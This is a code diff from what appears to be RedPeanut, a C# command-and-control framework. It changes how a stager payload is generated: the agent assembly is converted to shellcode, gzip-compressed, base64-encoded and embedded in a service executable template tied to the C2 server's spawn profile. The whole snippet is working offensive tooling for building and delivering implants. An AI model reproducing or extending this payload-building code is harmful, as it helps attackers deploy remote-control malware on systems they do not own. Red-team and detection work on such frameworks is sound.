@@ -182,33 +182,15 @@ namespace RedPeanut
                         source = Replacer.ReplaceAgentProfile(source, RedPeanut.Program.GetServerKey(),40, conf);
                     }
 
-                    string stagerstr = Convert.ToBase64String(CompressGZipAssembly(Builder.BuidStreamAssembly(source, RandomAString(10, new Random()),40)));
+                    string stagerstr = Convert.ToBase64String(CompressGZipAssembly(Builder.BuidStreamAssembly(source, RandomAString(10, new Random()) + ".dll",40)));
 
                     //Create TaskMsg gzip
                     if (agent != null)
                     {
-                        ModuleConfig modconfig = new ModuleConfig
-                        {
-                            Assembly = stagerstr,
-                            Method = "Execute",
-                            Moduleclass = "RedPeanutRP",
-                            Parameters = new string[] { "pippo" }
-                        };
-
-                        TaskMsg task = new TaskMsg
-                        {
-                            TaskType = "module",
-                            ModuleTask = modconfig,
-                            Agentid = agent.AgentId
-                        };
-
-                        if (agent.Pivoter != null)
-                            task.AgentPivot = agent.Pivoter.AgentId;
-
+                        
                         //Create Service stream gzip
                         source = File.ReadAllText(Path.Combine(folderrpath, SERVICE_TEMPLATE))
-                        .Replace("#NUTCLR#", ReadResourceFile(PL_COMMAND_NUTCLR))
-                        .Replace("#TASK#", Convert.ToBase64String(CompressGZipAssembly(Encoding.Default.GetBytes(JsonConvert.SerializeObject(task)))))
+                        .Replace("#NUTCLR#", Convert.ToBase64String(CompressGZipAssembly(Builder.GenerateShellcode(stagerstr, RandomString(10, new Random()) + ".exe", "RedPeanutRP", "Main", new string[] { "" }))))
                         .Replace("#SPAWN#", Program.GetC2Manager().GetC2Server().GetProfile(profile).Spawn);
 
                         string servicestr = Convert.ToBase64String(CompressGZipAssembly(Builder.BuidStreamAssembly(source, RandomAString(10, new Random()),40,"exe")));
